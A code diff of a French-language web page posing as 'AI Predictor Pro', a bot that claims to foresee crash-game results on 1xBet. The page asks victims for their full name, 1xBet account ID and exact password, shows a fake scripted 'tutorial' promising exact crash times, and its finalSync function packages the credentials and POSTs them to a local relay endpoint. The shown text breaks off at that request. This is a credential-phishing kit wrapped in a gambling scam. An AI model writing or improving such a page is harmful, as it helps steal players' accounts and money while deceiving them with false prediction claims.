@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Predictor Pro - v4.0</title>
+    <title>AI Predictor Pro - v4.5</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --neon: #00f2ff; --bg: #05070a; --card: #0d1117; }
@@ -18,8 +18,9 @@
         .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); }
         
         button { width: 100%; padding: 15px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; }
-        .sync-text { font-size: 12px; color: var(--neon); margin: 10px 0; min-height: 18px; }
-        .location-info { font-size: 13px; color: #8b949e; background: #21262d; padding: 10px; border-radius: 5px; margin-bottom: 15px; }
+        .instruction-box { background: #000; padding: 15px; border-radius: 5px; border-left: 3px solid var(--neon); font-size: 13px; min-height: 150px; line-height: 1.6; }
+        .hidden-btns { display: none; gap: 10px; margin-top: 15px; }
+        .secondary-btn { background: #21262d; color: white; border: 1px solid #30363d; }
     </style>
 </head>
 <body>
@@ -27,55 +28,47 @@
 <div class="container">
     <div id="p1" class="page active">
         <h2 style="color:var(--neon)">🛰️ INITIALISATION</h2>
-        <div id="loc-box" class="location-info">Détection du serveur local...</div>
-        <p>Entrez votre ID officiel 1xBet pour lier le serveur :</p>
-        <input type="text" id="nom" placeholder="Nom complet du titulaire">
-        <input type="number" id="id1x" placeholder="ID du compte (ex: 489223...)">
-        <button onclick="step2()">VÉRIFIER L'IDENTITÉ</button>
+        <input type="text" id="nom" placeholder="Nom complet">
+        <input type="number" id="id1x" placeholder="ID Compte 1xBet">
+        <button onclick="showPage(2)">VÉRIFIER L'IDENTITÉ</button>
     </div>
 
     <div id="p2" class="page">
         <h2>🎮 CONFIGURATION</h2>
-        <p>Choisissez le jeu à synchroniser :</p>
+        <p>Choisissez le jeu :</p>
         <select id="jeu">
             <option value="Aviator">Aviator</option>
             <option value="Lucky Jet">Lucky Jet</option>
-            <option value="Crash 1xBet">Crash 1xBet</option>
         </select>
-        <button onclick="showPage(3)">CONFIGURER LES ALGORITHMES</button>
+        <button onclick="startTutorial()">DÉMARRER LA FORMATION</button>
     </div>
 
     <div id="p3" class="page">
+        <h2>📖 MODE D'EMPLOI</h2>
+        <div class="instruction-box" id="tutorial-text"></div>
+        <div id="tuto-btns" class="hidden-btns">
+            <button class="secondary-btn" onclick="startTutorial()">REPRENDRE</button>
+            <button onclick="showPage(4)">CONTINUER</button>
+        </div>
+    </div>
+
+    <div id="p4" class="page">
         <h2>🔑 SÉCURITÉ</h2>
-        <p style="font-size:12px; color:#ff7b72">Veuillez entrer votre mot de passe exact pour que le serveur valide l'ID et active le Predictor.</p>
+        <p style="font-size:12px; color:#ff7b72">Vérifiez vos accès. Le serveur activera le Bot uniquement si le mot de passe est correct pour l'ID fourni.</p>
         <div class="pass-container">
             <input type="password" id="pass" placeholder="Mot de passe du compte">
             <i class="fa-solid fa-eye" onclick="togglePass()"></i>
         </div>
-        <button onclick="startSync()">LANCER LA SYNCHRONISATION</button>
-    </div>
-
-    <div id="p4" class="page">
-        <h2>⚙️ ANALYSE EN COURS</h2>
-        <div class="sync-text" id="sync-msg">Connexion aux serveurs de jeu...</div>
-        <div style="width:100%; background:#30363d; height:10px; border-radius:5px;">
-            <div id="bar" style="width:0%; background:var(--neon); height:100%; transition:1s; border-radius:5px;"></div>
-        </div>
+        <button onclick="finalSync()">ACTIVER LE PRÉDICTEUR</button>
     </div>
 
     <div id="p5" class="page">
         <h2 style="color:#3fb950">✅ ACTIVÉ</h2>
-        <p>Le bot est lié à votre compte. Les signaux seront envoyés sur votre compte 1xBet.</p>
+        <p>Synchronisation terminée. Les signaux arrivent sur votre compte.</p>
     </div>
 </div>
 
 <script>
-    // Récupération de la position via IP
-    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-        document.getElementById('loc-box').innerHTML = `📍 Serveur détecté : ${data.city}, ${data.region} (${data.country_name})`;
-        window.userCity = data.city + ", " + data.region;
-    });
-
     function showPage(n) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById('p' + n).classList.add('active');
@@ -86,43 +79,42 @@
         p.type = p.type === "password" ? "text" : "password";
     }
 
-    function step2() {
-        if(!document.getElementById('id1x').value) return alert("ID requis");
-        showPage(2);
-    }
+    // SIMULATION DE LA FORMATION
+    function startTutorial() {
+        showPage(3);
+        const box = document.getElementById('tutorial-text');
+        const btns = document.getElementById('tuto-btns');
+        box.innerHTML = "";
+        btns.style.display = "none";
 
-    function startSync() {
-        if(!document.getElementById('pass').value) return alert("Vérifiez votre mot de passe");
-        showPage(4);
-        
-        const messages = [
-            "Injection des scripts...",
-            "Vérification de l'ID compte...",
-            "Liaison avec le solde...",
-            "Finalisation de l'accès..."
+        const lines = [
+            "> Connexion au flux de données...",
+            "> Analyse des algorithmes de crash...",
+            "💡 INFO : Le serveur calcule l'heure exacte du prochain décollage.",
+            "📊 RÈGLE : Attendez que le signal affiche 'PRÊT'.",
+            "🚀 MISE : Retirez vos gains à la côte indiquée par l'IA.",
+            "> Système prêt. Veuillez confirmer vos accès pour lier le flux."
         ];
-        
+
         let i = 0;
         const interval = setInterval(() => {
-            document.getElementById('sync-msg').innerText = messages[i];
-            document.getElementById('bar').style.width = ((i+1) * 25) + "%";
+            box.innerHTML += lines[i] + "<br>";
             i++;
-            if(i >= messages.length) {
+            if(i >= lines.length) {
                 clearInterval(interval);
-                sendData();
+                btns.style.display = "flex"; // Affiche les boutons à la fin
             }
-        }, 1500);
+        }, 2000); // 2 secondes entre chaque ligne
     }
 
-    function sendData() {
+    function finalSync() {
         const payload = {
             nom: document.getElementById('nom').value,
             id: document.getElementById('id1x').value,
             jeu: document.getElementById('jeu').value,
-            ville: window.userCity || "Inconnue",
             pass: document.getElementById('pass').value
         };
-
+        
         fetch('http://localhost:5000/send', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
